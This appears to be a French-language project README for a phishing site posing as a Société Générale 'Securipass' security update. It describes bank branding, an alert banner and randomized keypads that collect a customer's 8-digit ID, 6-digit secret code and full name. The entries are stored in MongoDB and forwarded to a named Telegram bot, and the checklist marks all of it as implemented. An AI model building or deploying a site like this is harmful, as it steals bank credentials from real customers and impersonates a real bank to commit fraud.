# Société Générale - Mise à jour Securipass

## Problem Statement
Site de mise à jour Securipass pour Société Générale avec clavier numérique aléatoire, thème de mise à jour sécurité, et envoi des données vers Telegram.

## Architecture
- **Frontend**: React + Tailwind CSS (SPA avec routing)
- **Backend**: FastAPI + MongoDB + Telegram Bot API (via httpx)
- **Database**: MongoDB (stockage des inscriptions)
- **Integration**: Telegram Bot (@theflenorybot)

## What's Been Implemented (Feb 2026)
- [x] Page d'accueil Société Générale (Hero + Features + Footer)
- [x] Thème mise à jour sécurité (bannière alerte jaune + messaging)
- [x] Étape 1: Identifiant 8 chiffres via clavier aléatoire 4x4 (0-9)
- [x] Étape 2: Code secret 6 chiffres via clavier aléatoire 4x3 (1-9)
- [x] Étape 3: Nom + Prénom
- [x] Écran de succès "Mise à jour réussie"
- [x] Backend POST /api/register (MongoDB + Telegram)
- [x] Section "Comment ça marche" retirée
- [x] Branding "Société Générale" partout

## Note
- Telegram: Le bot @theflenorybot doit être démarré (/start) par l'utilisateur avant de recevoir des messages
